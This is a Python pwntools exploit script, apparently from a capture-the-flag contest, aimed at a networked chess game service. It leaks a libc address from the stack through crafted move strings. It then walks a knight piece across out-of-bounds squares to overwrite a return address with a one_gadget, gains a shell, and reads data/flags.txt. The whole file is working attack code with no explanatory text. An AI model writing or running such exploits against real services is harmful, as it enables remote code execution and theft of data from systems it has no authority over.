import sys
from pwn import *

PRINT_MOVES = True


def encode_move(start_x, start_y, end_x, end_y):
    move = "%s%d-%s%d" % (chr(start_x + ord('a')), 2**32//8*7 + start_y + 1,
                          chr(end_x + ord('a')),  2**32//8*7 + end_y + 1)
    return move.encode()


def get_move_answer(io, verbose=False):
    ans = io.recvuntil(b"A B C D E F G H\n\n")
    if verbose:
        print(ans.decode(errors="backslashreplace"))
    return ans


def do_raw_move(io, move, verbose=False,wait_ans=True):
    io.sendline(move + b'\n')
    if PRINT_MOVES:
        print(move)
    if wait_ans:
        return get_move_answer(io, verbose)


def do_move(io, start_x, start_y, end_x, end_y, verbose=False, wait_ans=True):
    return do_raw_move(io, encode_move(start_x, start_y, end_x, end_y), verbose=verbose, wait_ans=wait_ans)


def do_empty_move(io, is_white_turn=True, verbose=False, wait_ans=True):
    if verbose:
        print("empty turn for", "write" if is_white_turn else "black")
    move = encode_move(5, -1, 7, -2)
    move += (b"Z" if is_white_turn else b"A") * (29 - len(move))
    move += b"A" if is_white_turn else b"Z"

    return do_raw_move(io, move, verbose, wait_ans)


def do_respawn_move(io, num, verbose=False, wait_ans=True):
    if verbose:
        print("respawn turn")
    move = encode_move(6, -1, 5, 1)
    move += b"A" * (30 - len(move))
    move += bytes([num])

    num_is_white = (num // 8) % 2 == 0

    if not num_is_white:
        do_empty_move(io, is_white_turn=True, verbose=verbose, wait_ans=wait_ans)

    ans = do_raw_move(io, move, verbose)

    if num_is_white:
        do_empty_move(io, is_white_turn=False, verbose=verbose, wait_ans=wait_ans)

    return ans


def get_stack_val(io, num, verbose=False):
    # should be white turn
    num_is_white = (num // 8) % 2 == 0

    ans = do_respawn_move(io, num, verbose=verbose)

    if not num_is_white:
        do_empty_move(io, is_white_turn=True, verbose=verbose)
    do_move(io, 5, 1, 6, -1, verbose=verbose)

    if num_is_white:
        do_empty_move(io, is_white_turn=False, verbose=verbose)

    board_bytes = ans.split(b"A B C D E F G H")[1]

    return bytes([board_bytes[146]])


def do_move_sequence(io, points, is_white, verbose=False):
    moves = 0
    if not is_white:
        do_empty_move(io, is_white_turn=True, verbose=verbose, wait_ans=False)
        moves += 1

    for pos in range(1, len(points)):
        start_x, start_y = points[pos-1]
        end_x, end_y = points[pos]

        do_move(io, start_x, start_y, end_x, end_y, verbose=verbose, wait_ans=False)
        do_empty_move(io, is_white_turn=not is_white, verbose=verbose, wait_ans=False)
        moves += 2

    if not is_white:
        do_empty_move(io, is_white_turn=False, verbose=verbose, wait_ans=False)
        moves += 1
    
    for i in range(moves):
        get_move_answer(io, verbose)
        

def travel_knight(io, points, start_val, end_val, verbose=False):
    is_start_white = (start_val // 8) % 2 == 0
    is_end_white = (end_val // 8) % 2 == 0

    if is_start_white == is_end_white:
        do_respawn_move(io, ord("Z") if is_start_white else ord("A"), verbose=verbose)
        do_move_sequence(io, points, not is_start_white, verbose=verbose)

    do_respawn_move(io, start_val, verbose=verbose)
    do_move_sequence(io, points, is_start_white, verbose=verbose)


# io = process('./chess')
io = remote(sys.argv[1], 3255)
io.sendline(b'login\n')
io.sendline(b'password\n')

io.recvuntil(b"A B C D E F G H\n\n").decode()

do_move(io, 5, 1, 5, 2, verbose=False)
do_move(io, 6, 7, 5, 5, verbose=False)

addr = b"\x00\x00"
addr += get_stack_val(io, 253)
addr += get_stack_val(io, 252)
addr += get_stack_val(io, 251)
addr += get_stack_val(io, 250)
addr += get_stack_val(io, 249)
addr += get_stack_val(io, 248)

libc_addr = u64(addr, endian="big")
print("libc_addr       %x" % libc_addr)

one_gadget_addr = libc_addr + 0xb622a
print("one_gadget_addr %x" % one_gadget_addr)

one_gadget_bytes = p64(one_gadget_addr, endian="big")
print(one_gadget_bytes)

SAFE_PATH = [[5, 1], [6, 3], [7, 5], [6, 7], [4, 8], [5, 10],[4, 12]]
PATH1 = SAFE_PATH + [[3, 14], [1, 13], [0, 15]]
PATH2 = SAFE_PATH + [[3, 14], [1, 15]]
PATH3 = SAFE_PATH + [[5, 14], [3, 13], [2, 15]]

travel_knight(io, PATH1, one_gadget_bytes[-1], addr[-1], verbose=False)
travel_knight(io, PATH2, one_gadget_bytes[-2], addr[-2], verbose=False)
travel_knight(io, PATH3, one_gadget_bytes[-3], addr[-3], verbose=False)

# some random checkmate
do_move(io, 2, 1, 2, 2, verbose=False)
do_move(io, 2, 6, 2, 5, verbose=False)
do_move(io, 3, 0, 0, 3, verbose=False)
do_move(io, 3, 7, 0, 4, verbose=False)
do_move(io, 0, 3, 2, 5, verbose=False)
do_move(io, 0, 6, 0, 5, verbose=False)
do_move(io, 0, 1, 0, 2, verbose=False)
do_move(io, 0, 4, 0, 3, verbose=False)

io.sendline(b'c6-c8\n')

io.sendline(b"A"*4096 + b"\n")
io.sendline(b"id;cat data/flags.txt; echo '<END>' exit\n")

print(io.recvuntil(b"<END>").decode())

# io.interactive()
